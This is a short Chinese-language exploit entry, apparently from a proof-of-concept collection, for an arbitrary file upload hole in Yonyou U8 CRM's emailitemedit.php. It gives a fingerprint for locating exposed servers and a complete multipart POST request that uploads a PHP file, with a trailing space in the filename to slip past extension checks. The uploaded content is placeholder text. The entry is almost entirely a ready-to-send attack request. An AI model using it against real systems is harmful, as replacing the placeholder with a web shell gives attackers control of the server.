# 用友-U8-CRM-emailitemedit存在任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/js/tfunction.js"`
- **请求**：`POST /email/emailitemedit.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----26952096723940687164243006…`

**请求体 / payload**
```
------269520967239406871642430066855
Content-Disposition: form-data; name="file"; filename="haha.php "
Content-Type: application/octet-stream
asdddddd
------269520967239406871642430066855
Content-Disposition: form-data; name="upload"
upload
------269520967239406871642430066855--
```
- **预期**：200　|　—